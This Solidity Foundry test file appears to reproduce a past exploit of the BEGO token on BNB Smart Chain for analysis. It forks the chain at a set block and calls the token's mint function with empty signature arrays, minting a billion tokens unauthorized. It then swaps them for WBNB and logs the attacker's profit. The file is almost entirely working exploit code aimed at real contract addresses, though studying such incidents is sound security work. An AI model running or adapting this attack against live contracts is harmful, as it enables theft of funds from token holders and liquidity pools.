// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/AnciliaInc/status/1582828751250784256
// https://twitter.com/peckshield/status/1582892058800685058
// TX
// https://bscscan.com/tx/0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57

interface BEGO20 is IERC20 {
    function mint(uint256, string memory, address, bytes32[] memory, bytes32[] memory, uint8[] memory) external;
}

contract ContractTest is DSTest {
    BEGO20 BEGO = BEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x88503F48e437a377f1aC2892cBB3a5b09949faDd);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 22_315_679);
    }

    function testExploit() public {
        bytes32[] memory _r = new bytes32[](0);
        bytes32[] memory _s = new bytes32[](0);
        uint8[] memory _v = new uint8[](0);
        BEGO.mint(1_000_000_000 * 1e18, "t", address(this), _r, _s, _v);
        BEGOToWBNB();

        emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function BEGOToWBNB() internal {
        BEGO.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BEGO);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BEGO.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
